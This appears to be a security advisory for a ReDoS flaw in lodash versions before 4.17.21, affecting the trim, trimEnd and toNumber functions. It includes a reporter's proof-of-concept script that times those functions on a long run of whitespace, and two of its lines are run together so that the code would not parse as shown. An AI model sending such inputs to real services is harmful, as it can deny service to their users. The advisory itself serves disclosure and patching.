  title: Regular Expression Denial of Service (ReDoS) in lodash
  date: 2022-01-06
  description: |
    All versions of package lodash prior to 4.17.21 are vulnerable
    to Regular Expression Denial of Service (ReDoS) via the
    `toNumber`, `trim` and `trimEnd` functions.

    Steps to reproduce (provided by reporter Liyuan Chen):

    ```
      var lo = require('lodash');

      function build_blank(n) {
         var ret = "1"
         for (var i = 0; i < n; i++) {
             ret += " "
         }
         return ret + "1";
     }
     var s = build_blank(50000) var time0 = Date.now();
     lo.trim(s)
     var time_cost0 = Date.now() - time0;
     console.log("time_cost0: " + time_cost0);
     var time1 = Date.now();
     lo.toNumber(s) var time_cost1 = Date.now() - time1;
     console.log("time_cost1: " + time_cost1);
     var time2 = Date.now();
     lo.trimEnd(s);
     var time_cost2 = Date.now() - time2;
     console.log("time_cost2: " + time_cost2);
    ```
